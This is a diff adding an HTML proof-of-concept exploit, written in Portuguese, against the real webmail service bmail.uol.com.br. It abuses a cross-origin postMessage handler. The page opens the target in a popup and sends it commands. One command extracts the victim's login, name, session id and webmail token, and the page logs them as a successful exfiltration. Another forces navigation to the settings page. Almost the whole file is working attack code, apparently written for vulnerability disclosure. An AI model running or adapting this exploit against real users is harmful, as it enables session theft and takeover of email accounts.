@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>PoC PostMessage BOL</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+#log { background: #000; padding: 10px; margin-top: 10px; white-space: pre-wrap; max-height: 400px; overflow-y: auto; border: 1px solid #333; }
+button { padding: 8px 16px; margin: 5px; background: #222; color: #0f0; border: 1px solid #0f0; cursor: pointer; }
+.success { color: #0f0; }
+.data { color: #ff0; }
+</style>
+</head>
+<body>
+<h2>PoC: Cross-Origin PostMessage Command Injection</h2>
+<p>Target: bmail.uol.com.br</p>
+<p>Origin desta pagina: <span id="myorigin"></span></p>
+<hr>
+<button id="btn1" onclick="openTarget()">1. Abrir Webmail</button>
+<button id="btn2" onclick="exfiltrate()" disabled>2. Exfiltrar Dados (exportConfigsService)</button>
+<button id="btn3" onclick="navigate()" disabled>3. Navegar para Settings (goToPath)</button>
+<div id="log"></div>
+
+<script>
+document.getElementById('myorigin').textContent = window.location.origin;
+var w = null;
+
+function log(msg, cls) {
+  var el = document.getElementById('log');
+  var d = document.createElement('div');
+  d.className = cls || '';
+  d.textContent = new Date().toISOString().substring(11,19) + ' ' + msg;
+  el.appendChild(d);
+  el.scrollTop = el.scrollHeight;
+}
+
+window.addEventListener('message', function(e) {
+  log('RESPOSTA RECEBIDA de origin=' + e.origin, 'success');
+  if (e.data && e.data.cmd === 'exportedConfigsService') {
+    var cfg = e.data.exported.configs.session;
+    log('idtPerson: ' + cfg.idtPerson, 'data');
+    log('login: ' + cfg.login, 'data');
+    log('name: ' + cfg.name, 'data');
+    log('esid: ' + (cfg.esid || '').substring(0, 60) + '...', 'data');
+    if (cfg.view && cfg.view.webmail) {
+      log('webmail token: ' + cfg.view.webmail.token, 'data');
+    }
+    log('EXFILTRACAO COMPLETA! Dados sensiveis obtidos cross-origin.', 'success');
+  } else {
+    log('data: ' + JSON.stringify(e.data).substring(0, 300), 'data');
+  }
+});
+
+function openTarget() {
+  w = window.open('https://bmail.uol.com.br/#/webmail/0//INBOX/page:1', 'bolmail');
+  if (w) {
+    log('Janela do webmail aberta. Aguarde carregar...', 'success');
+    document.getElementById('btn2').disabled = false;
+    document.getElementById('btn3').disabled = false;
+  } else {
+    log('Popup bloqueado pelo navegador. Permita popups para este site.');
+  }
+}
+
+function exfiltrate() {
+  if (!w) return;
+  log('Enviando comando exportConfigsService...');
+  w.postMessage({cmd: 'exportConfigsService'}, '*');
+}
+
+function navigate() {
+  if (!w) return;
+  log('Enviando comando goToPath -> /configuration/webmail/signature...');
+  w.postMessage({cmd: 'goToPath', path: '/configuration/webmail/signature'}, '*');
+  log('Verifique a janela do webmail, deve ter mudado para Settings.', 'success');
+}
+</script>
+</body>
+</html>
